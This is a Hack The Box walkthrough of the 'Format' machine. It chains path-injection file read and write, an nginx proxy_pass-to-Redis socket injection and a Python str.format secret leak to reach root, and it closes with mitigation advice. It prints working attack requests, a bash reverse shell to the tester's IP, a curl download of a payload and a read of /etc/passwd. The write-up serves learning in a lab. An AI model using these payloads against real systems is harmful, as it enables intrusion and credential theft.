---
layout: post
title: Hack The Box Walkthrough - Format
date: 2023-09-30
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Medium
- Machine
permalink: /2023/09/HTB/Format
img: 2023/09/Format/Format.png
---

This was a very fun box. I got the initial foothold by using nginx misconfiguration to modify a value in Redis, and writing a PHP file where I should not have been able to. Next, I found a user's password in Redis. And finally, exploited a vulnerability in python's `string.format` to get root.

* Room: Format
* Difficulty: {{ page.tags[3] }}
* URL: [https://app.hackthebox.com/machines/Format](https://app.hackthebox.com/machines/Format)
* Author: [coopertim13](https://app.hackthebox.com/users/55851)

## Enumeration

As always, I started by looking for open ports.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛
                                                                                                                                                                                                                                           [~] The config file is expected to be at "/home/ehogue/.rustscan.toml"                                                                                                                                                                     [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.222.87:22
Open 10.129.222.87:80
Open 10.129.222.87:3000
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-13 15:02 EDT
NSE: Loaded 155 scripts for scanning.
Host is up, received syn-ack (0.045s latency).
Scanned at 2023-05-13 15:02:41 EDT for 12s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 c397ce837d255d5dedb545cdf20b054f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC58JQV36v8AqpQB6tJC5upH5YdXw4LMaUJ4Exx+H6PjPZDab5MSx7Zm1oA1DWewM8tmU8fcprIxykYA8Z66Sd5ll/M1WntYO1b3LxxA0kI9F3yXQU+D2LMV6dGsqalJ80WWYcowlt3hZie6gnz4qEDj7ijCFi5h8K4R2rKtA16sH4FC9EQQU7qgN4WkE7uJSJS/6tWREtV/PspxsiMSBhUE0BreHurM6eaTZGa0VHOyNpbsZ3KXDro0fIOlfovRJVdAwWXF740M+X3aVngS9p1+XrnsVIqcL9T7GdU6H2Tyl5JvnGLdOr2Etd9NW41f+g+RYl7QY6WYbX+30racRmcTUtH4DODyeDXazi6fRUiXBI8pXkD3oLMBSxXsbeGT8Ja3LECPTybIl/jH3KRfl46P7TIUYZ2kqTZqxJ1B6klyZY+woh24UPDrZu/rW9JMaBz2tg97tAiLR8pLZxLrpVH7YmV8vXk2Sgo1rEuqKhBAK98bQuAsbocbjiyrKYAACc=
|   256 b3aa30352b997d20feb6758840a517c1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAxL4FuxiK0hKkwexmffoZfwAs+0TzHjqgv3sbokWQzlt+YGLBXHmGuLjgjfi9Ir49zbxEL6iAOv8/Mj8hUPQVk=
|   256 fab37d6e1abcd14b68edd6e8976727d7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK9eUks4+f4DtePOKRJYzDggTf1cOpMhtAxXHGSqr5ng
80/tcp   open  http    syn-ack nginx 1.18.0
|_http-title: Site doesn't have a title (text/html).
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0
3000/tcp open  http    syn-ack nginx 1.18.0
|_http-title: Did not follow redirect to http://microblog.htb:3000/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:02
Completed NSE at 15:02, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:02
Completed NSE at 15:02, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:02
Completed NSE at 15:02, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.09 seconds
```

There were three open ports:
* 22 (SSH)
* 80 (HTTP)
* 3000 (HTTP)

The site on port 80 was redirecting to 'app.microblog.htb' and the one on port 3000 to 'microblog.htb'. I added those two domains to my hosts file and scanned for more subdomains.

```bash
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -X POST -t30 --hw 11 -H "Host:FUZZ.microblog.htb" "http://microblog.htb"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://microblog.htb/
Total requests: 648201

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000035136:   200        83 L     306 W      3973 Ch     "app"
000506106:   200        42 L     434 W      3731 Ch     "sunny"

Total time: 755.3687
Processed Requests: 648201
Filtered Requests: 648199
Requests/sec.: 858.1252
```

It found 'sunny.microblog.htb'. I added that to my hosts file also.

## Getting a Foothold

### Microblog Site

I opened a browser and looked at the application on 'app.microblog.htb'.

![Microblog Application](/assets/images/2023/09/Format/AppMicroblog.png "Microblog Application")

It was an application that allowed creating small blogs. The 'contribute' link at the bottom of the page was taking us to a public Git repository hosted in Gitea on port 3000. I cloned the repository, but kept looking at the site before digging in the code.

There was a login page. I tried simple credentials, but they didn't work. I used the Register link to create an account.

![Register](/assets/images/2023/09/Format/Register.png "Register")

Once registered, I could create microblogs.

![Registered](/assets/images/2023/09/Format/Registered.png "Registered")

The page had an ad to buy a pro licence that would allow uploading images. This looked very interesting. File uploads are great to get code execution. But the feature was not implemented yet.

![Go Pro](/assets/images/2023/09/Format/GoPro.png "Go Pro")

I created a blog. It asked me for a subdomain. I created a few and added them to my hosts file to be able to access them. This hinted at the possibility of a proxy allowing serving all those different subdomains.

Once created, it was added to my list of blogs and I could visit it and edit it.

![My Blogs](/assets/images/2023/09/Format/MyBlogs.png "My Blogs")

I looked at the blog, it started empty. 

![Empty Blog](/assets/images/2023/09/Format/EmptyBlog.png "Empty Blog")

I went to the edit page. I could add headers and text to the blog.

![Edit Blog](/assets/images/2023/09/Format/EditBlog.png "Edit Blog")

I added fields and reloaded my blog, the new content was there.

![Blog With Content](/assets/images/2023/09/Format/BlogWithContent.png "Blog With Content")

I tried adding some [XSS](https://owasp.org/www-community/attacks/xss/) payloads. They worked, but no one else seemed to be visiting the site. I also tried [SSTI](https://portswigger.net/web-security/server-side-template-injection), that failed.

### Sunny Microblog

I visited the site on 'sunny.microblog.htb'. It was an instance of a microblog that talked about Philadelphia and Danny DeVito.

![Sunny Microblog](/assets/images/2023/09/Format/SunnyMicroblog.png "Sunny Microblog")

### Source Code Analysis

After trying the simple things on the site, I went back to the code I cloned from the Gitea repository. The repository user was named 'cooper', I tried creating an application user with that name to see if I could brute force their password. The creation worked, so that was not the username used to create the sunny blog.

I looked at the repository history. Sometimes there are credentials that were added and removed from the code. I did not find anything like that in the different commits.

There was a lot of code in the repository. It was organized in a few directories for the different applications.

* html - Just a redirection to app.microblog.htb
* microblog/app - The main microblog application
* microblog/sunny - The sunny microblog instance
* microblog-template - The template used when creating microblog instance
* microbucket - CSS and JS static files, also health.txt for both types of static files
* pro-files - [Bulletproof](https://github.com/samayo/bulletproof) image upload library

I took a lot of notes while reading the code. There are a few things that stand out.

#### Microblog Application

As stated earlier, this was the main application. The one where I could create users and blogs.

* The application used Redis Hash to store the user's information
* Passwords are stored in clear in Redis
* There was a lot or repeated code, maybe some instances had bugs?
* User creation always set isPro to false, but there is code to add functionalities if isPro is true
  * There is no code that set isPro to true, maybe [some injection](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis) is possible?
* This is how a new blog is created:
  * Validate the name
  * List the folders in `/var/www/microblog/` to make sure it does not exist
  * Make `/var/www/microblog/` writable
  * Create a new folder for the blog
  * Copy the template in the new folder
  * Remove write permissions
  * Make the `content` subfolder writable
* There is probably a race condition in this code. If I find a way to write files, I should be able to write a PHP file while a blog is being created

#### Microblog Instances

This code is contained in the sunny microblog and in `microblog-template`. The only difference is that sunny already have some content in it.

* Blog content is stored in `/var/www/microblog/BLOG_NAME/content/`
  * There is a file called `order.txt` that contains the list of posts in order
  * The list is simply the file name to read for the content
  * The HTML for the parts is contained if the files listed
  * The HTML is ready with [file_get_contents](https://www.php.net/file_get_contents) and appended to the HTML for the blog
    * PHP code will not be executed by `file_get_contents`
* The edit page will load `bulletproof.php` with [require_once](https://www.php.net/require_once)
  * This code will be executed
* If the user is pro this will be executed:
  * Make the blog writable
  * Copy `bulletproof.php` in `edit/`
  * Create a folder for uploads
  * Remove write permissions
* The part that adds the Bulletproof code is also vulnerable to a race condition
* This is how content is added to the blog
  * A file is created in `content/` with the HTML
  * The filename is added to `order.txt`
  * The filename is the id that is passed in the POST
    * Could probably be used to write files outside `content/`
* When creating the HTML, the code reads any file from `order.txt` without any validation
  * If I can insert filename, I might be able to read arbitrary files from the server

### Reading files

From reading the code, I knew that the id from the POST was used as a filename. I tried creating a PHP file and accessing it directly with the URL `http://admin.microblog.htb/content/test.php`. The file was accessible, but PHP code was not executed in `content/`.

I tried writing files in other directories using some `../`. This failed as those folders were not writable. I knew that there was a possibility to get a race condition and used this to write files in the webroot. But I'm lazy, so I wanted to exhaust all other options before starting to write code for this.

The code that built the blog page was reading any files it found in `order.txt`, without any validation. So I figure I could make it read arbitrary files from the server. I tried with `/etc/passwd`.

I created a text element on my blog.

```http
POST /edit/index.php HTTP/1.1
Host: test.microblog.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Origin: http://test.microblog.htb
Connection: keep-alive
Referer: http://test.microblog.htb/edit/
Cookie: username=4t15pao1o1hblg1q65ep41cl0k
Upgrade-Insecure-Requests: 1
Content-Length: 24

id=/etc/passwd&txt=test2
```

This is the code that creates the text element.

```php
//add text
if (isset($_POST['txt']) && isset($_POST['id'])) {
    chdir(getcwd() . "/../content");
    $txt_nl = nl2br($_POST['txt']);
    $html = "<div class = \"blog-text\">{$txt_nl}</div>";
    $post_file = fopen("{$_POST['id']}", "w");
    fwrite($post_file, $html);
    fclose($post_file);
    $order_file = fopen("order.txt", "a");
    fwrite($order_file, $_POST['id'] . "\n");  
    fclose($order_file);
    header("Location: /edit?message=Section added!&status=success");
}
```

It tries to write the content passed in `txt` to the file passed in `id`. This would fail. But since there is no validation, the file path is still added to `order.txt`.

Then when I reloaded my blog, this code will be used to generate the HTML.

```php
function fetchPage() {
    chdir(getcwd() . "/content");
    $order = file("order.txt", FILE_IGNORE_NEW_LINES);
    $html_content = "";
    foreach($order as $line) {
        $temp = $html_content;
        $html_content = $temp . "<div class = \"{$line}\">" . file_get_contents($line) . "</div>";
    }
    return $html_content;
}
```

The code reads any file path found in `order.txt` and add it's content to the page. Again, without any validation. 

So the POST appends `/etc/passwd` to the list of files to read, and `fetchPage` add it's content to my blog.

I reloaded the blog and it contains the content of the `passwd` file.

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
cooper:x:1000:1000::/home/cooper:/bin/bash
redis:x:103:33::/var/lib/redis:/usr/sbin/nologin
git:x:104:111:Git Version Control,,,:/home/git:/bin/bash
messagebus:x:105:112::/nonexistent:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:997:997::/var/log/laurel:/bin/false
```

With this, I tried reading files that could be interesting. I was able to read cooper's `.bashrc`. But not there SSH private key. I tried reading files from `/proc/self`, but did not find anything interesting.

I was able to read nginx configuration by posting this text element.

```
id=/etc/nginx/sites-enabled/default&txt=test2
```

Loading the blog, I got the content.

```nginx
# You should look at the following URL's in order to grasp a solid understanding
# of Nginx configuration files in order to fully unleash the power of Nginx.
# https://www.nginx.com/resources/wiki/start/
# https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/
# https://wiki.debian.org/Nginx/DirectoryStructure
#
# In most cases, administrators will remove this file from sites-enabled/ and
# leave it as reference inside of sites-available where it will continue to be
# updated by the nginx packaging team.
#
# This file will automatically load configuration files provided by other
# applications, such as Drupal or Wordpress. These applications will be made
# available underneath a path with that package name, such as /drupal8.
#
# Please see /usr/share/doc/nginx-doc/examples/ for more detailed examples.
##

# Default server configuration
#
server {
	listen 80 default_server;
	listen [::]:80 default_server;

	# SSL configuration
	#
	# listen 443 ssl default_server;
	# listen [::]:443 ssl default_server;
	#
	# Note: You should disable gzip for SSL traffic.
	# See: https://bugs.debian.org/773332
	#
	# Read up on ssl_ciphers to ensure a secure configuration.
	# See: https://bugs.debian.org/765782
	#
	# Self signed certs generated by the ssl-cert package
	# Don't use them in a production server!
	#
	# include snippets/snakeoil.conf;

	root /var/www/html;

	# Add index.php to the list if you are using PHP
	index index.html index.htm index.nginx-debian.html;

	server_name _;

	location / {
		# First attempt to serve request as file, then
		# as directory, then fall back to displaying a 404.
		try_files $uri $uri/ =404;
	}

	# pass PHP scripts to FastCGI server
	#
	#location ~ \.php$ {
	#	include snippets/fastcgi-php.conf;
	#
	#	# With php-fpm (or other unix sockets):
	#	fastcgi_pass unix:/run/php/php7.4-fpm.sock;
	#	# With php-cgi (or other tcp sockets):
	#	fastcgi_pass 127.0.0.1:9000;
	#}

	# deny access to .htaccess files, if Apache's document root
	# concurs with nginx's one
	#
	#location ~ /\.ht {
	#	deny all;
	#}
}

server {
	listen 80;
	listen [::]:80;

	root /var/www/microblog/app;

	index index.html index.htm index-nginx-debian.html;

	server_name microblog.htb;

	location / {
		return 404;
	}

	location = /static/css/health/ {
		resolver 127.0.0.1;
		proxy_pass http://css.microbucket.htb/health.txt;
	}

	location = /static/js/health/ {
		resolver 127.0.0.1;
		proxy_pass http://js.microbucket.htb/health.txt;
	}

	location ~ /static/(.*)/(.*) {
		resolver 127.0.0.1;
		proxy_pass http://$1.microbucket.htb/$2;
	}
}
```

### Writing Files

Since the code to create elements did not validate the path, I thought I could use it to write files also. Most paths were not writable, but I know that the file `order.txt` had to be writable by the web server. I tried to overwrite the one for sunny.

```http
POST /edit/index.php HTTP/1.1
Host: admin.microblog.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Origin: http://admin.microblog.htb
Connection: keep-alive
Referer: http://admin.microblog.htb/edit/?message=Section%20added!&status=success
Cookie: username=6kpc8r44d0r4n7tt9ah1o05j3g
Upgrade-Insecure-Requests: 1
Content-Length: 53

id=/var/www/microblog/sunny/content/order.txt&txt=aaa
```

It worked! The blog sunny was broken. When I read it, this is what it contained.

```html
<div class="blog-text">aaa</div>
```

### Becoming Pro

At this point, I knew I could read and write files on the server. This confirmed that the race condition was possible. But being lazy I still tried to avoid writing code. I checked the forum at this point to see if there were something else, or if I should write the code for the race condition. It confirmed the race condition existed, but was not the intended way. It also hinted at a known issue with using nginx proxy_pass with Redis.

I found a [blog post](https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/) that was using the same proxy_pass configuration as the one the server used for the static files in `microbucket`.

```nginx
location ~ /static/(.*)/(.*) {
  resolver 127.0.0.1;
  proxy_pass http://$1.microbucket.htb/$2;
}
```

The blog explains how proxy_pass can be used to proxy requests to a unix socket. The application was using a socket to connect to Redis, so that looked promising.

```php
$redis = new Redis();
$redis->connect('/var/run/redis/redis.sock');
```

The blog uses [MSET](https://redis.io/commands/mget/) as it accepts multiple arguments. But the code was using [Redis Hashes](https://redis.io/docs/data-types/hashes/), not simple key-value pairs. Luckily, [HSET](https://redis.io/commands/hset/) also supports multiple arguments.

I gave this a try. It took me longer than it should have, I used the `username` cookie value instead of the actual username. But when I realized my mistake, getting it to set pro to true was easy.

```
HSET /static/unix:%2Fvar%2Frun%2Fredis%2Fredis%2Esock:admin%20pro%20%22true%22%20aa/styles.css HTTP/1.1
Host: microblog.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/css,*/*;q=0.1
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://app.microblog.htb/
```

I refreshed the page and I was pro.

![Pro](/assets/images/2023/09/Format/Pro.png "Pro")

### Getting a Shell

Now that was pro, I could upload images to the server. I tried uploading PHP files, but that failed. I also tried uploading images with a PHP extensions, and some PHP code in the file. But the files were renamed to `.png`.

I was looking for known vulnerabilities in Bulletproof when I realized that the file was created by the web server. So once created, I might be able to overwrite it.

```php
<?php
$username = session_name("username");
session_set_cookie_params(0, '/', '.microblog.htb');
session_start();
if(file_exists("bulletproof.php")) {
    require_once "bulletproof.php";
}

...

function provisionProUser() {
    if(isPro() === "true") {
        $blogName = trim(urldecode(getBlogName()));
        system("chmod +w /var/www/microblog/" . $blogName);
        system("chmod +w /var/www/microblog/" . $blogName . "/edit");
        system("cp /var/www/pro-files/bulletproof.php /var/www/microblog/" . $blogName . "/edit/");
        system("mkdir /var/www/microblog/" . $blogName . "/uploads && chmod 700 /var/www/microblog/" . $blogName . "/uploads");
        system("chmod -w /var/www/microblog/" . $blogName . "/edit && chmod -w /var/www/microblog/" . $blogName);
    }
    return;
}
```

The code to the edit page starts by loading `bulletproof.php` if it exists. Then later, it will copy the original file in the edit folder. So the file belongs to `www-data`, and might be writable since the code remove write permission from the folder, but not the file. And since the file is loaded first, any code it contains will be executed before it get overwriten.

I tried replacing it with simple PHP code.

```http
POST /edit/index.php HTTP/1.1
Host: admin.microblog.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Origin: http://test.microblog.htb
Connection: keep-alive
Referer: http://test.microblog.htb/edit/
Cookie: username=6kpc8r44d0r4n7tt9ah1o05j3g
Upgrade-Insecure-Requests: 1
Content-Length: 49

id=../edit/bulletproof.php&txt=<?php echo 'IN';?>
```

The I reloaded the edit page. I had code execution.

![Code Execution](/assets/images/2023/09/Format/CodeExecution.png "Code Execution")

When I reloaded the edit page, my message was gone. The file gets overwitten on every execution.

I tried using this to launch a reverse shell, but it failed. Most likely due to some special characters in my code. I could have tried removing them. Instead I chose to do it in two requests. One that used curl to download the PHP code. And a second one to execute the downloaded code.

First I created the PHP file that would launch the reverse shell and started a Python web server.

```bash
$ cat test.php
<?php
`bash -c 'bash -i >& /dev/tcp/10.10.14.3/4444 0>&1'`;
?>

$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Next I used the code execution through writing to `bulletproof.php` to download my PHP file on the server.

```http
POST /edit/index.php HTTP/1.1
Host: admin.microblog.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Origin: http://test.microblog.htb
Connection: keep-alive
Referer: http://test.microblog.htb/edit/
Cookie: username=6kpc8r44d0r4n7tt9ah1o05j3g
Upgrade-Insecure-Requests: 1
Content-Length: 92

id=../edit/bulletproof.php&txt=<?php `curl http://10.10.14.3/test.php -o /tmp/test.php` ; ?>
```

I reloaded the edit page and saw a hit on my web server. Next, I launched a netcat listener on my machine and used the vulnerability to execute the downloaded file.

```http
POST /edit/index.php HTTP/1.1
Host: admin.microblog.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Origin: http://test.microblog.htb
Connection: keep-alive
Referer: http://test.microblog.htb/edit/
Cookie: username=6kpc8r44d0r4n7tt9ah1o05j3g
Upgrade-Insecure-Requests: 1
Content-Length: 65

id=../edit/bulletproof.php&txt=<?php require '/tmp/test.php' ; ?>
```

I refreshed the edit page again, and I was in.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.213] 34072
bash: cannot set terminal process group (621): Inappropriate ioctl for device
bash: no job control in this shell

www-data@format:~/microblog/test/edit$ whoami
whoami
www-data
```

## Getting User

Once on the server, becoming cooper was easy. I already knew that Redis had some clear text credentials. I connected to Redis and looked at what I could find.

```bash
www-data@format:~$ redis-cli -s /var/run/redis/redis.sock
redis /var/run/redis/redis.sock> keys *
1) "cooper.dooper:sites"
2) "admin:sites"
3) "PHPREDIS_SESSION:3su56a5kmrh92ne0u6ericvq88"
4) "PHPREDIS_SESSION:4t15pao1o1hblg1q65ep41cl0k"
5) "PHPREDIS_SESSION:dn57t52dn86s5irdfmc6afmc5v"
6) "cooper.dooper"
7) "admin"

redis /var/run/redis/redis.sock> hgetall admin
 1) "username"
 2) "admin"
 3) "password"
 4) "admin"
 5) "first-name"
 6) "admin"
 7) "last-name"
 8) "admin"
 9) "pro"
10) "true"
11) "aa.microbucket.htb/styles.css"
12) "HTTP/1.0"

redis /var/run/redis/redis.sock> hgetall cooper.dooper
 1) "username"
 2) "cooper.dooper"
 3) "password"
 4) "REDACTED"
 5) "first-name"
 6) "Cooper"
 7) "last-name"
 8) "Dooper"
 9) "pro"
10) "false"
```

I had a password for cooper. I tried to use it in SSH and it worked.

```bash
$ ssh cooper@target                                        
The authenticity of host 'target (10.10.11.213)' can't be established.
ED25519 key fingerprint is SHA256:30cTQN6W3DKQMMwb5RGQA6Ie1hnKQ37/bSbe+vpYE98.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target' (ED25519) to the list of known hosts.
cooper@target's password: 
Linux format 5.10.0-22-amd64 #1 SMP Debian 5.10.178-3 (2023-04-22) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon May 22 20:40:36 2023 from 10.10.14.40

cooper@format:~$ cat user.txt 
REDACTED
```

## Getting Root

I looked if cooper could run anything with sudo.

```bash
cooper@format:~$ sudo -l
[sudo] password for cooper: 
Matching Defaults entries for cooper on format:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cooper may run the following commands on format:
    (root) /usr/bin/license

cooper@format:~$ file /usr/bin/license 
/usr/bin/license: Python script, ASCII text executable
cooper@format:~$ vim /usr/bin/license
```

They were allowed to run a Python script as root. I tried it, it created licenses for the application users.

```bash
cooper@format:~$ sudo /usr/bin/license
usage: license [-h] (-p username | -d username | -c license_key)
license: error: one of the arguments -p/--provision -d/--deprovision -c/--check is required

cooper@format:~$ sudo /usr/bin/license -p cooper

User does not exist. Please provide valid username.

cooper@format:~$ sudo /usr/bin/license -p cooper.dooper

License key has already been provisioned for this user

cooper@format:~$ sudo /usr/bin/license -d cooper.dooper

License key deprovisioning coming soon

cooper@format:~$ sudo /usr/bin/license -c aaaaa

License key invalid
```

I looked at the code, the file was around 100 lines. But this part looked interesting considering the name of the box.

```python
prefix = "microblog"
username = r.hget(args.provision, "username").decode()
firstlast = r.hget(args.provision, "first-name").decode() + r.hget(args.provision, "last-name").decode()
license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)
print("")
print("Plaintext license key:")
print("------------------------------------------------------")
print(license_key)
```

The code called `format` on a string that contained some parts that I controlled. I tried adding formats in my user's first name. It failed because only the License object was passed as a parameter to `format`. I looked for ways to [exploit it](https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/). From an object, I can access the `__init__` attribute. From this I can read the global variables. 

I went back to Redis and changed my first name to access the secret variable from the code.

```
redis /var/run/redis/redis.sock> hgetall admin
 1) "first-name"
 2) "admin"
 3) "username"
 4) "admin"
 5) "password"
 6) "admin"
 7) "last-name"
 8) "admin"
 9) "pro"
10) "false"
redis /var/run/redis/redis.sock> hset admin first-name "-->{license.__init__.__globals__[secret]}<--"
(integer) 0
redis /var/run/redis/redis.sock> hgetall admin
 1) "first-name"
 2) "-->{license.__init__.__globals__[secret]}<--"
 3) "username"
 4) "admin"
 5) "password"
 6) "admin"
 7) "last-name"
 8) "admin"
 9) "pro"
10) "false"
```

The secret is read from a file in root home folder. And it's used to encrypt the license key. So I thought it might be useful to decrypt cooper's license key.

```python
secret = [line.strip() for line in open("/root/license/secret")][0]
secret_encoded = secret.encode()
```

I generate the key, and the secret was printed.

```bash
cooper@format:~$ sudo /usr/bin/license -p admin

Plaintext license key:
------------------------------------------------------
microblogadminhGHX'_:9`cVN(ekPpIT}:.F4\jPXjLkicgpf`AKH-->REDACTED<--admin

Encrypted license key (distribute to customer):
------------------------------------------------------
gAAAAABknyZhNipNODjT93Szct2MWHCwheOANaCe7EgiV-gkOXr2_kMRfNsdzUbxe8CNn1HmIm9o_tjJRvNKOg-eexXBAvRjz6QaDvC8CHVNDEyzF-GdIuJVdw08I5mBX5OBo2eeLUuWVI_Pcc9Qo8E1r0RvGMEcmfOnRH0ulJRMOFx4lgFvuxfyPKKjx2P6BGoe2x_O_Qqj
```

I tried to use the secret as root password. It worked. I didn't even have to use it to decrypt anything.

```bash
cooper@format:~$ su
Password: 

root@format:/home/cooper# cat /root/root.txt 
REDACTED
```

## Mitigation

The first issue with the box is with the nginx configuration. The fact that it uses a user controlled variable directly after the 'http://' scheme made it easy to use the socket. Making Redis require authentication would also have helped prevent this attack.

The application was doing a decent job at validating user's data. Things like username and blog name were validated. But there was absolutely no validation around the id used when creating blog elements. The code should use an allow list to block most characters. Even better, the ID should have been created on the server. And every constructed path should be validated to make sure the end result is still in the correct folder.

There are also issues with passwords in this box. The password used for cooper is used in the web application, and for the Linux user. The fact that the application stored the password in clear text made that even worst. Same with root's password. It's used for the Linux user, and as the secret key in the script. Every password and key should be unique.

The last issue was with the call to `format`. It should not be used on users generated data. The recommendation is to use [Template strings](https://docs.python.org/3.4/library/string.html#template-strings). The data from the user should not be part of the template, but placed in variables to replace placeholders.
